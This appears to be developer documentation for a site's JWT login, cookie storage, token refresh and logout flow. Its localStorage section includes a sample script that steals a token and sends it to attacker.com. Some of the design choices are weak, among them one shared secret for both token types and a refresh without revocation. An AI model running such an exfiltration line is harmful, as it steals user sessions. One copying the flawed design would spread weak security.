# Authentication & JWT Session Management

## Overview

This document explains the complete authentication flow including JWT token generation, session management, token storage, and how users are authorized for protected resources.

## Architecture

### Stateless JWT Authentication

The system uses JSON Web Tokens (JWT) for stateless authentication. No session data is stored on the server. All authentication state is maintained via tokens.

### Key Components

1. Access Token - Short-lived token for API requests (7 days)
2. Refresh Token - Long-lived token for renewing access (30 days)
3. Redux Store - Client-side state management with persistence
4. Authorization Middleware - Server-side token verification
5. Protected Routes - Frontend route guards

## Complete Authentication Flow

### Phase 1: User Login

#### Step 1: User Submits Credentials

User enters email and password in LoginForm.

```
User Input:
- email: "user@example.com"
- password: "MyPassword123"
```

#### Step 2: Frontend Dispatches Redux Action

```javascript
// LoginForm.jsx
dispatch(signInStart()); // Sets isLoading: true in Redux

AuthService.signin({ email, password })
  .then(response => {
    dispatch(signInSuccess(response));
  })
  .catch(error => {
    dispatch(signInFailure(error.message));
  });
```

#### Step 3: API Request Sent

```javascript
// auth.service.js
apiClient.post('/api/auth/signin', {
  email: "user@example.com",
  password: "MyPassword123"
})
```

HTTP Request:
```
POST https://api.tohfae.com/api/auth/signin
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "MyPassword123"
}
```

#### Step 4: Backend Validates Input

```javascript
// Zod validation middleware
signinSchema.parse(req.body)

// Schema:
{
  email: z.string().email().toLowerCase().trim(),
  password: z.string().min(1)
}
```

#### Step 5: Backend Authenticates User

```javascript
// auth.service.js - signin()

// 1. Find user by email
const user = await User.findOne({ email }).select("+password");

// 2. Verify password
const isPasswordValid = await user.comparePassword(password);

// 3. Check email verification
if (!user.isEmailVerified) {
  throw new ApiError(401, "Please verify your email");
}

// 4. Check user status
if (user.status !== "active") {
  throw new ApiError(403, "Account is inactive");
}
```

#### Step 6: Generate JWT Tokens

```javascript
// jwt.js - generateTokens()

const accessToken = jwt.sign(
  { userId: user._id },
  process.env.JWT_SECRET,
  { expiresIn: "7d" }
);

const refreshToken = jwt.sign(
  { userId: user._id },
  process.env.JWT_SECRET,
  { expiresIn: "30d" }
);

return { accessToken, refreshToken };
```

Token Structure:
```
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "userId": "507f1f77bcf86cd799439011",
  "iat": 1709049600,
  "exp": 1709654400
}

Signature:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  JWT_SECRET
)
```

#### Step 7: Backend Sets Cookies and Returns Response

Backend sets httpOnly cookies:
```javascript
// Cookies set by backend (not visible to JavaScript)
Set-Cookie: accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Secure; SameSite=Strict; Max-Age=604800
Set-Cookie: refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
```

JSON Response (NO TOKENS):
```json
{
  "success": true,
  "message": "Login successful",
  "user": {
    "id": "507f1f77bcf86cd799439011",
    "email": "user@example.com",
    "firstName": "John",
    "lastName": "Doe",
    "role": "customer",
    "avatar": null
  }
}
```

#### Step 8: Frontend Stores Only User Data

```javascript
// LoginForm.jsx - handleSubmit success

dispatch(signInSuccess({
  user: response.user
  // NO tokens - they're in httpOnly cookies
}));

// Redux authSlice updates state:
state.user = response.user;
state.isAuthenticated = true;
state.isLoading = false;
state.error = null;
// NO tokens in Redux state
```

#### Step 9: Redux Persist Saves User Data to LocalStorage

```javascript
// Redux Persist saves only user data (not tokens)

localStorage.setItem('persist:root', JSON.stringify({
  auth: {
    user: { id: "...", email: "...", firstName: "...", ... },
    isAuthenticated: true
    // No tokens stored in localStorage
  }
}));

// Tokens are stored in httpOnly cookies by the browser
// Cookies: accessToken=eyJhbGci...; refreshToken=eyJhbGci...
```

#### Step 10: User Redirected to Home

```javascript
// LoginForm.jsx
router.push('/');
```

### Phase 2: Making Authorized Requests

#### Step 1: User Navigates to Protected Resource

User tries to access their profile or make a purchase.

```javascript
// Example: Fetch user profile
ProfileService.getProfile();
```

#### Step 2: Frontend Sends Request with Cookies

```javascript
// apiClient.js - withCredentials: true sends cookies automatically

const apiClient = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL,
  withCredentials: true // Automatically includes cookies
});

// Actual HTTP Request:
GET https://api.tohfae.com/api/users/profile
Cookie: accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; refreshToken=eyJhbGci...
```

#### Step 3: Backend Receives Request

```javascript
// Express route with authentication middleware

router.get('/profile', authenticate, userController.getProfile);
```

#### Step 4: Authentication Middleware Verifies Token

```javascript
// auth.middleware.js - authenticate()

// 1. Extract token from cookies
const token = req.cookies.accessToken;

if (!token) {
  throw new ApiError(401, "No token provided");
}

// 2. Verify token signature and expiration
const decoded = jwt.verify(token, process.env.JWT_SECRET);
// decoded = { userId: "507f1f77bcf86cd799439011", iat: ..., exp: ... }

// 3. Find user in database
const user = await User.findById(decoded.userId);

// 4. Check user status
if (user.status !== "active" || !user.isEmailVerified) {
  throw new ApiError(401, "Unauthorized");
}

// 5. Attach user to request object
req.user = {
  id: user._id,
  email: user.email,
  role: user.role,
  status: user.status
};

// 6. Continue to controller
next();
```

#### Step 5: Controller Accesses Authenticated User

```javascript
// user.controller.js - getProfile()

export const getProfile = async (req, res) => {
  // req.user is available from middleware
  const userId = req.user.id;

  const user = await User.findById(userId);

  res.json({
    success: true,
    user: {
      id: user._id,
      email: user.email,
      firstName: user.profile.firstName,
      lastName: user.profile.lastName,
      phone: user.profile.phone,
      avatar: user.profile.avatar
    }
  });
};
```

#### Step 6: Frontend Receives Protected Data

```javascript
// ProfileService.getProfile() response

{
  "success": true,
  "user": {
    "id": "507f1f77bcf86cd799439011",
    "email": "user@example.com",
    "firstName": "John",
    "lastName": "Doe",
    "phone": "+919876543210",
    "avatar": "https://..."
  }
}
```

### Phase 3: Token Expiration & Refresh

#### Scenario: Access Token Expires

Access tokens expire after 7 days. When expired, the frontend must refresh it.

#### Step 1: API Request Fails with 401

```javascript
// apiClient.js - Response interceptor

if (error.response.status === 401 && error.response.data.code === "TOKEN_EXPIRED") {
  // Token expired, try to refresh
  // Refresh token is automatically sent in cookies

  // Call refresh endpoint
  const response = await axios.post(
    '/api/auth/refresh-token',
    {}, // No body needed - refresh token in cookie
    { withCredentials: true }
  );

  // Backend sets new cookies automatically
  // No need to update Redux - cookies handled by browser

  // Retry original request
  return axios(originalRequest);
}
```

#### Step 2: Backend Verifies Refresh Token

```javascript
// auth.controller.js - refreshToken()

export const refreshToken = async (req, res, next) => {
  try {
    // 1. Get refresh token from cookie
    const refreshToken = req.cookies.refreshToken;

    if (!refreshToken) {
      throw new ApiError(401, "No refresh token");
    }

    // 2. Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.JWT_SECRET);

    // 3. Find user
    const user = await User.findById(decoded.userId);

    // 4. Generate new tokens
    const tokens = generateTokens(user._id);

    // 5. Set new cookies
    res.cookie('accessToken', tokens.accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000
    });

    res.cookie('refreshToken', tokens.refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 30 * 24 * 60 * 60 * 1000
    });

    res.status(200).json({
      success: true,
      message: "Token refreshed"
    });
  } catch (error) {
    next(error);
  }
};
```

#### Step 3: Frontend Continues

New tokens are automatically stored in cookies by the browser. No Redux update needed.

### Phase 4: User Logout

#### Step 1: User Clicks Logout

```javascript
// UserProfileMenu.jsx

const handleSignOut = async () => {
  await AuthService.signout();
  dispatch(logout());
  router.push('/');
};
```

#### Step 2: Frontend Clears Auth State

```javascript
// authSlice.js - logout reducer

state.user = null;
state.isAuthenticated = false;
state.error = null;
// NO tokens in Redux state to clear
```

#### Step 3: Backend Clears Cookies

```javascript
// auth.controller.js - signout()

res.clearCookie('accessToken');
res.clearCookie('refreshToken');
```

#### Step 4: Redux Persist Clears User Data

```javascript
// Only user data cleared from localStorage
// Tokens were never in localStorage
localStorage.removeItem('persist:root');
```

#### Step 5: User Redirected to Home

User is now logged out. Cookies are cleared, so they cannot access protected resources.

## Session Persistence

### How Sessions Survive Page Refresh

#### With HttpOnly Cookies:
```
User logs in -> Cookies set by browser -> Refresh page -> Cookies still present -> User still logged in
```

#### With Redux Persist (User Data Only):
```
User logs in -> User data saved to localStorage -> Refresh page -> User data restored -> isAuthenticated flag set
```

### Session Persistence Flow

#### On Login:
```
1. User logs in
2. Backend sets httpOnly cookies (accessToken, refreshToken)
3. Redux state updated with user data only
4. Redux Persist saves user data to localStorage
5. User can refresh page and remain logged in
```

#### On Page Load:
```
1. App initializes
2. Redux Persist reads user data from localStorage
3. Auth state restored (user data + isAuthenticated flag)
4. Cookies automatically sent with every API request
5. User is authenticated automatically
```

#### On Logout:
```
1. User logs out
2. Backend clears cookies
3. Redux state cleared
4. Redux Persist removes user data from localStorage
5. User must log in again
```

### Why This Approach Works

1. **Tokens in Cookies** - Browser manages token storage and sending
2. **User Data in Redux** - Fast access to user info without API call
3. **Redux Persist** - User data survives page refresh
4. **Separation of Concerns** - Tokens (secure) vs User Data (convenience)

## Token Storage Strategy

### Recommended: HttpOnly Cookies (Most Secure)

#### Why HttpOnly Cookies?

HttpOnly cookies are the most secure way to store JWT tokens because:

1. **XSS Protection** - Not accessible via JavaScript, preventing XSS attacks
2. **Automatic Sending** - Browser automatically includes cookies in requests
3. **Secure Flag** - Can be marked as HTTPS-only
4. **SameSite Protection** - Prevents CSRF attacks when configured properly

#### Backend Implementation

```javascript
// auth.controller.js - signin

export const signin = async (req, res, next) => {
  try {
    const { email, password } = req.body;
    const result = await authService.signin(email, password);

    // Set tokens in httpOnly cookies
    res.cookie('accessToken', result.accessToken, {
      httpOnly: true,        // Not accessible via JavaScript
      secure: process.env.NODE_ENV === 'production', // HTTPS only in production
      sameSite: 'strict',    // CSRF protection
      maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
    });

    res.cookie('refreshToken', result.refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
    });

    // Return user data only (no tokens in response body)
    res.status(200).json({
      success: true,
      message: result.message,
      user: result.user
    });
  } catch (error) {
    next(error);
  }
};
```

#### Frontend Implementation

```javascript
// apiClient.js - No need to manually add Authorization header

const apiClient = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL,
  timeout: 10000,
  withCredentials: true, // Important: Send cookies with requests
  headers: {
    'Content-Type': 'application/json'
  }
});

// No request interceptor needed - cookies sent automatically
```

#### Redux State (User Data Only)

```javascript
// authSlice.js - Store user data only, not tokens

const initialState = {
  user: null,
  isAuthenticated: false,
  isLoading: false,
  error: null
  // No accessToken or refreshToken in state
};

const authSlice = createSlice({
  name: 'auth',
  initialState,
  reducers: {
    signInSuccess: (state, action) => {
      state.user = action.payload.user;
      state.isAuthenticated = true;
      state.isLoading = false;
      state.error = null;
      // Tokens are in httpOnly cookies, not in Redux
    }
  }
});
```

#### Logout Implementation

```javascript
// auth.controller.js - signout

export const signout = async (req, res, next) => {
  try {
    // Clear cookies
    res.clearCookie('accessToken');
    res.clearCookie('refreshToken');

    res.status(200).json({
      success: true,
      message: "Signed out successfully"
    });
  } catch (error) {
    next(error);
  }
};
```

### Alternative: LocalStorage (Less Secure)

#### Why NOT LocalStorage?

LocalStorage is vulnerable to XSS attacks:

```javascript
// Malicious script can steal tokens
const token = localStorage.getItem('accessToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

#### When to Use LocalStorage

Only use localStorage if:
- You need to support cross-domain requests
- You cannot use cookies (e.g., mobile apps)
- You have strong XSS protection (CSP headers, input sanitization)

#### LocalStorage Implementation (If Required)

```javascript
// Redux Persist configuration
const persistConfig = {
  key: 'root',
  storage,
  whitelist: ['auth']
};

// Security mitigations required:
// 1. Content Security Policy headers
// 2. Strict input sanitization
// 3. Short token expiration
// 4. Regular security audits
```

### Comparison Table

| Feature | HttpOnly Cookies | LocalStorage |
|---------|------------------|--------------|
| XSS Protection | Yes (not accessible via JS) | No (accessible via JS) |
| CSRF Protection | Requires SameSite flag | Not vulnerable |
| Automatic Sending | Yes | No (manual header) |
| Cross-Domain | Limited | Easy |
| Mobile Apps | Limited | Easy |
| Security Rating | High | Medium |
| Recommended | Yes | Only if necessary |

### Our Implementation Choice

**We use HttpOnly Cookies** for maximum security:

1. Tokens stored in httpOnly cookies on backend
2. Redux stores only user data (no tokens)
3. Cookies automatically sent with every request
4. XSS attacks cannot steal tokens
5. SameSite flag prevents CSRF attacks

## Authorization Flow Diagram

```
[User Login]
     |
     v
[Frontend: LoginForm]
     |
     v
[POST /api/auth/signin]
     |
     v
[Backend: Validate Credentials]
     |
     v
[Generate JWT Tokens]
     |
     v
[Backend: Set httpOnly cookies with tokens]
     |
     v
[Return: user data only (NO tokens in response)]
     |
     v
[Frontend: Store user data in Redux]
     |
     v
[Redux Persist: Save user data to localStorage]
     |
     v
[User Authenticated]
     |
     |---> [User Makes Request]
     |          |
     |          v
     |     [apiClient: withCredentials sends cookies]
     |          |
     |          v
     |     [Backend: authenticate middleware]
     |          |
     |          v
     |     [Extract token from req.cookies.accessToken]
     |          |
     |          v
     |     [Verify JWT signature]
     |          |
     |          +---> VALID --> [Attach user to req.user]
     |          |                    |
     |          |                    v
     |          |               [Controller processes request]
     |          |                    |
     |          |                    v
     |          |               [Return protected data]
     |          |
     |          +---> EXPIRED --> [Return 401 TOKEN_EXPIRED]
     |          |                      |
     |          |                      v
     |          |                 [Frontend: Refresh token]
     |          |                      |
     |          |                      v
     |          |                 [POST /api/auth/refresh-token]
     |          |                      |
     |          |                      v
     |          |                 [Backend: Get refresh token from cookie]
     |          |                      |
     |          |                      v
     |          |                 [Verify refresh token]
     |          |                      |
     |          |                      v
     |          |                 [Generate new tokens]
     |          |                      |
     |          |                      v
     |          |                 [Set new cookies]
     |          |                      |
     |          |                      v
     |          |                 [Retry original request]
     |          |
     |          +---> INVALID --> [Return 401 INVALID_TOKEN]
     |                                |
     |                                v
     |                           [Frontend: Logout user]
     |                                |
     |                                v
     |                           [Backend: Clear cookies]
     |
     |---> [User Logs Out]
              |
              v
         [Frontend: Clear Redux state]
              |
              v
         [Redux Persist: Clear localStorage]
              |
              v
         [User Unauthenticated]
```

## Security Measures

### 1. JWT Security

#### Token Signing
```javascript
// Tokens are signed with a secret key
const token = jwt.sign(
  { userId: user._id },
  process.env.JWT_SECRET, // Strong secret (256-bit minimum)
  { expiresIn: "7d" }
);
```

#### Token Verification
```javascript
// Backend verifies signature on every request
const decoded = jwt.verify(token, process.env.JWT_SECRET);
// If signature is invalid or token is expired, throws error
```

### 2. Password Security

#### Hashing
```javascript
// Passwords are hashed before storage (bcrypt)
const hashedPassword = await bcrypt.hash(password, 10);
```

#### Comparison
```javascript
// Passwords are compared using bcrypt
const isValid = await bcrypt.compare(password, user.password);
```

### 3. Token Expiration

- Access Token: 7 days (short-lived)
- Refresh Token: 30 days (long-lived)
- Expired tokens are automatically rejected

### 4. HTTPS Only

All API requests must use HTTPS in production to prevent token interception.

### 5. CORS Configuration

```javascript
// Only allow requests from trusted origins
const CORS_OPTIONS = {
  origin: process.env.CLIENT_URL,
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"]
};
```

### 6. Input Validation

All input is validated using Zod schemas before processing.

### 7. Rate Limiting

Login attempts are rate-limited to prevent brute force attacks.

### 8. User Status Checks

```javascript
// Middleware checks user status on every request
if (user.status !== "active" || !user.isEmailVerified) {
  throw new ApiError(401, "Unauthorized");
}
```

## API Endpoints

### Authentication Endpoints

#### POST /api/auth/signup
Create new user account.

Request:
```json
{
  "email": "user@example.com",
  "password": "MyPassword123",
  "confirmPassword": "MyPassword123",
  "firstName": "John",
  "lastName": "Doe",
  "phone": "+919876543210"
}
```

Response:
```json
{
  "success": true,
  "message": "Signup successful. Please verify your email.",
  "user": {
    "id": "507f1f77bcf86cd799439011",
    "email": "user@example.com",
    "firstName": "John"
  }
}
```

#### POST /api/auth/verify-email
Verify email with OTP.

Request:
```json
{
  "email": "user@example.com",
  "otp": "123456"
}
```

Response Headers:
```
Set-Cookie: accessToken=eyJhbGci...; HttpOnly; Secure; SameSite=Strict
Set-Cookie: refreshToken=eyJhbGci...; HttpOnly; Secure; SameSite=Strict
```

Response Body:
```json
{
  "success": true,
  "message": "Email verified successfully",
  "user": {
    "id": "507f1f77bcf86cd799439011",
    "email": "user@example.com",
    "firstName": "John",
    "lastName": "Doe",
    "role": "customer"
  }
}
```

#### POST /api/auth/signin
Login with email and password.

Request:
```json
{
  "email": "user@example.com",
  "password": "MyPassword123"
}
```

Response Headers:
```
Set-Cookie: accessToken=eyJhbGci...; HttpOnly; Secure; SameSite=Strict; Max-Age=604800
Set-Cookie: refreshToken=eyJhbGci...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
```

Response Body:
```json
{
  "success": true,
  "message": "Login successful",
  "user": {
    "id": "507f1f77bcf86cd799439011",
    "email": "user@example.com",
    "firstName": "John",
    "lastName": "Doe",
    "role": "customer",
    "avatar": null
  }
}
```

#### POST /api/auth/refresh-token
Refresh access token using refresh token from cookie.

Request:
```json
{}
```

Request Headers (automatic):
```
Cookie: refreshToken=eyJhbGci...
```

Response Headers:
```
Set-Cookie: accessToken=eyJhbGci...; HttpOnly; Secure; SameSite=Strict; Max-Age=604800
Set-Cookie: refreshToken=eyJhbGci...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
```

Response Body:
```json
{
  "success": true,
  "message": "Token refreshed successfully"
}
```

#### POST /api/auth/signout
Logout user and clear cookies.

Response Headers:
```
Set-Cookie: accessToken=; HttpOnly; Secure; SameSite=Strict; Max-Age=0
Set-Cookie: refreshToken=; HttpOnly; Secure; SameSite=Strict; Max-Age=0
```

Response Body:
```json
{
  "success": true,
  "message": "Signed out successfully"
}
```

### Protected Endpoints

All protected endpoints automatically receive cookies with requests (no manual headers needed).

Request Headers (automatic):
```
Cookie: accessToken=eyJhbGci...; refreshToken=eyJhbGci...
```

#### GET /api/users/profile
Get current user profile.

Response:
```json
{
  "success": true,
  "user": {
    "id": "507f1f77bcf86cd799439011",
    "email": "user@example.com",
    "firstName": "John",
    "lastName": "Doe",
    "phone": "+919876543210",
    "avatar": "https://...",
    "role": "customer",
    "status": "active"
  }
}
```

## Error Responses

### 400 Bad Request - Validation Error

```json
{
  "success": false,
  "code": "VALIDATION_ERROR",
  "message": "Validation failed",
  "errors": [
    {
      "field": "email",
      "message": "Invalid email format"
    },
    {
      "field": "password",
      "message": "Password must be at least 8 characters"
    }
  ]
}
```

### 401 Unauthorized - Invalid Credentials

```json
{
  "success": false,
  "code": "INVALID_CREDENTIALS",
  "message": "Invalid email or password"
}
```

### 401 Unauthorized - Token Expired

```json
{
  "success": false,
  "code": "TOKEN_EXPIRED",
  "message": "Token has expired"
}
```

### 401 Unauthorized - Invalid Token

```json
{
  "success": false,
  "code": "INVALID_TOKEN",
  "message": "Invalid token"
}
```

### 403 Forbidden - Email Not Verified

```json
{
  "success": false,
  "code": "EMAIL_NOT_VERIFIED",
  "message": "Please verify your email before signing in"
}
```

### 409 Conflict - Email Already Exists

```json
{
  "success": false,
  "code": "EMAIL_ALREADY_EXISTS",
  "message": "Email already exists"
}
```

## Frontend Implementation

### Redux Store Configuration

```javascript
// store/index.js

import { configureStore } from '@reduxjs/toolkit';
import { persistStore, persistReducer } from 'redux-persist';
import storage from 'redux-persist/lib/storage';
import { authReducer } from '@/redux/slice/authSlice';

const persistConfig = {
  key: 'root',
  storage,
  whitelist: ['auth'] // Persist only user data, not tokens
};

const persistedReducer = persistReducer(persistConfig, authReducer);

export const store = configureStore({
  reducer: {
    auth: persistedReducer
  },
  middleware: (getDefaultMiddleware) =>
    getDefaultMiddleware({
      serializableCheck: {
        ignoredActions: ['persist/PERSIST', 'persist/REHYDRATE']
      }
    })
});

export const persistor = persistStore(store);
```

### Auth Slice

```javascript
// slice/authSlice.js

import { createSlice } from '@reduxjs/toolkit';

const initialState = {
  user: null,
  isAuthenticated: false,
  isLoading: false,
  error: null
  // No tokens in Redux - they're in httpOnly cookies
};

const authSlice = createSlice({
  name: 'auth',
  initialState,
  reducers: {
    signInStart: (state) => {
      state.isLoading = true;
      state.error = null;
    },
    signInSuccess: (state, action) => {
      state.user = action.payload.user;
      state.isAuthenticated = true;
      state.isLoading = false;
      state.error = null;
      // Tokens are in httpOnly cookies, not in Redux
    },
    signInFailure: (state, action) => {
      state.isLoading = false;
      state.error = action.payload;
    },
    logout: (state) => {
      state.user = null;
      state.isAuthenticated = false;
      state.error = null;
      // Cookies cleared by backend
    }
  }
});

export const {
  signInStart,
  signInSuccess,
  signInFailure,
  logout
} = authSlice.actions;

export const selectUser = (state) => state.auth.user;
export const selectIsAuthenticated = (state) => state.auth.isAuthenticated;
export const selectIsLoading = (state) => state.auth.isLoading;

export const authReducer = authSlice.reducer;
```

### API Client with Cookie Support

```javascript
// services/api/apiClient.js

import axios from 'axios';
import { store } from '@/redux/store';
import { logout } from '@/redux/slice/authSlice';

const apiClient = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL,
  timeout: 10000,
  withCredentials: true, // Important: Send cookies with every request
  headers: {
    'Content-Type': 'application/json'
  }
});

// No request interceptor needed - cookies sent automatically by browser

// Response interceptor - Handle token expiration
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If token expired, try to refresh
    if (
      error.response?.status === 401 &&
      error.response?.data?.code === 'TOKEN_EXPIRED' &&
      !originalRequest._retry
    ) {
      originalRequest._retry = true;

      try {
        // Refresh token is automatically sent in cookie
        await axios.post(
          `${process.env.NEXT_PUBLIC_API_URL}/api/auth/refresh-token`,
          {}, // No body needed
          { withCredentials: true } // Send cookies
        );

        // Backend sets new cookies automatically
        // Retry original request
        return apiClient(originalRequest);
      } catch (refreshError) {
        // Refresh failed - logout user
        store.dispatch(logout());
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);

export default apiClient;
```

### Using Auth in Components

```javascript
// components/SomeComponent.jsx

import { useSelector } from 'react-redux';
import { selectUser, selectIsAuthenticated } from '@/redux/slice/authSlice';

export default function SomeComponent() {
  const user = useSelector(selectUser);
  const isAuthenticated = useSelector(selectIsAuthenticated);

  if (!isAuthenticated) {
    return <Link href="/login">Please login</Link>;
  }

  return (
    <div>
      <h1>Welcome, {user.firstName}!</h1>
      <p>Email: {user.email}</p>
    </div>
  );
}
```

## Summary

### Authentication Flow

1. User submits login credentials
2. Backend validates input using Zod schemas
3. Backend verifies password using bcrypt
4. Backend generates JWT tokens (access + refresh)
5. Backend sets httpOnly cookies with tokens
6. Frontend stores only user data in Redux
7. Redux Persist saves user data to localStorage
8. User is authenticated

### Authorization Flow

1. User makes API request
2. Browser automatically sends cookies with request
3. Backend middleware extracts token from cookies
4. Backend middleware verifies token signature
5. Backend middleware checks token expiration
6. Backend middleware loads user from database
7. Backend middleware attaches user to request
8. Controller processes request with authenticated user
9. Protected data returned to frontend

### Token Refresh Flow

1. Access token expires
2. API request fails with 401 TOKEN_EXPIRED
3. Frontend automatically calls refresh endpoint (refresh token sent in cookie)
4. Backend verifies refresh token from cookie
5. Backend generates new tokens
6. Backend sets new cookies
7. Frontend retries original request
8. Request succeeds with new token from cookie

### Session Persistence

1. Backend sets httpOnly cookies with tokens
2. Redux Persist saves user data to localStorage
3. On page refresh, Redux Persist restores user data
4. Cookies automatically sent with every request
5. User remains authenticated across sessions
6. User can close browser and return later (cookies persist)

### Security Features

1. JWT tokens signed with secret key
2. Passwords hashed with bcrypt
3. Tokens expire automatically
4. HTTPS enforced in production
5. CORS configured for trusted origins
6. Input validated with Zod schemas
7. Rate limiting on login attempts
8. User status checked on every request

This architecture provides a secure, scalable, and maintainable authentication system with excellent user experience.

